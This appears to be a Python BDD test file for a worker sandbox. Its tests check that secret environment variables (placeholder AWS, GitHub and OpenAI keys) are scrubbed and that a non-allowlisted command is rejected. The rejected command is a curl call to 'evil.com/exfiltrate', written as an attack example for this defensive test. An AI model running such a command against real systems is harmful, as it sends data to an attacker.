"""BDD test implementation for US-0027: Zero-Trust Autonomous Worker Process Sandboxing and Environment Scrubbing."""

from __future__ import annotations

import subprocess
from pathlib import Path
from typing import Any

import pytest
from pytest_bdd import given, parsers, scenarios, then, when

from spec_ops.worker.sandbox_env import (
    DEFAULT_TOOLCHAIN_ENV_VARS,
    SandboxedWorkerRunner,
    SecurityViolationError,
    sanitize_environment,
)

scenarios("features/us_0027_worker_sandboxing.feature")


@pytest.fixture
def sandbox_bdd_context(tmp_path: Path) -> dict[str, Any]:
    return {
        "tmp_path": tmp_path,
        "ambient_env": {},
        "sanitized_env": {},
        "runner": None,
        "execution_error": None,
        "execution_completed": None,
        "subprocesses_spawned": 0,
    }


# Scenario 1: Scrubbing sensitive environment variables before worker spawn


@given(parsers.parse('an ambient parent environment containing "{var1}" and "{var2}"'))
def ambient_parent_env_with_secrets(sandbox_bdd_context: dict[str, Any], var1: str, var2: str):
    env = {
        "PATH": "/usr/local/bin:/usr/bin:/bin",
        "HOME": "/home/developer",
        "USER": "developer",
        "LANG": "en_US.UTF-8",
        "TERM": "xterm-256color",
        "VIRTUAL_ENV": "/home/developer/.venv",
        var1: "AKIAIOSFODNN7EXAMPLE40SECRET",  # pragma: allowlist secret
        var2: "ghp_123456789012345678901234567890123456",  # pragma: allowlist secret
        "OTHER_RANDOM_VARIABLE": "should_be_stripped_because_not_allowlisted",
        "OPENAI_API_KEY": "sk-proj-1234567890abcdef1234567890",  # pragma: allowlist secret
        "MY_DATABASE_PASSWORD": "supersecretpassword123!",
    }
    sandbox_bdd_context["ambient_env"] = env


@when("the worker sandbox sanitizes the execution environment")
def sanitize_worker_env(sandbox_bdd_context: dict[str, Any]):
    env = sandbox_bdd_context["ambient_env"]
    sanitized = sanitize_environment(env)
    sandbox_bdd_context["sanitized_env"] = sanitized


@then("the resulting worker environment dictionary contains only allowlisted variables")
def verify_only_allowlisted_variables(sandbox_bdd_context: dict[str, Any]):
    sanitized = sandbox_bdd_context["sanitized_env"]
    for key in sanitized.keys():
        assert key in DEFAULT_TOOLCHAIN_ENV_VARS, f"Unexpected non-allowlisted variable in env: {key}"


@then("all high-entropy secret variables are stripped")
def verify_secrets_stripped(sandbox_bdd_context: dict[str, Any]):
    sanitized = sandbox_bdd_context["sanitized_env"]
    assert "AWS_SECRET_ACCESS_KEY" not in sanitized
    assert "GITHUB_TOKEN" not in sanitized
    assert "OPENAI_API_KEY" not in sanitized
    assert "MY_DATABASE_PASSWORD" not in sanitized
    assert "OTHER_RANDOM_VARIABLE" not in sanitized


# Scenario 2: Blocking non-allowlisted command execution in sandboxed worktree


@given("a sandboxed worker runner")
def sandboxed_worker_runner(sandbox_bdd_context: dict[str, Any]):
    wt_dir = sandbox_bdd_context["tmp_path"] / "worktree"
    wt_dir.mkdir(parents=True, exist_ok=True)
    runner = SandboxedWorkerRunner(worktree_dir=wt_dir)
    sandbox_bdd_context["runner"] = runner


@when("an attempt is made to execute an unapproved binary outside the allowlist")
def attempt_unapproved_binary_execution(sandbox_bdd_context: dict[str, Any], monkeypatch: pytest.MonkeyPatch):
    runner: SandboxedWorkerRunner = sandbox_bdd_context["runner"]

    spawn_count = 0
    orig_run = subprocess.run

    def tracking_run(*args: Any, **kwargs: Any) -> Any:
        nonlocal spawn_count
        spawn_count += 1
        return orig_run(*args, **kwargs)

    monkeypatch.setattr(subprocess, "run", tracking_run)

    try:
        res = runner.run("curl -s https://evil.com/exfiltrate")
        sandbox_bdd_context["execution_completed"] = res
    except Exception as exc:
        sandbox_bdd_context["execution_error"] = exc
    finally:
        sandbox_bdd_context["subprocesses_spawned"] = spawn_count


@then("the execution is rejected with a security violation error")
def verify_security_violation_error(sandbox_bdd_context: dict[str, Any]):
    error = sandbox_bdd_context["execution_error"]
    assert error is not None, "Expected an execution error, but command completed without error"
    assert isinstance(error, SecurityViolationError)
    assert isinstance(error, PermissionError)
    assert "curl" in str(error)


@then("zero subprocesses are spawned")
def verify_zero_subprocesses(sandbox_bdd_context: dict[str, Any]):
    assert sandbox_bdd_context["subprocesses_spawned"] == 0
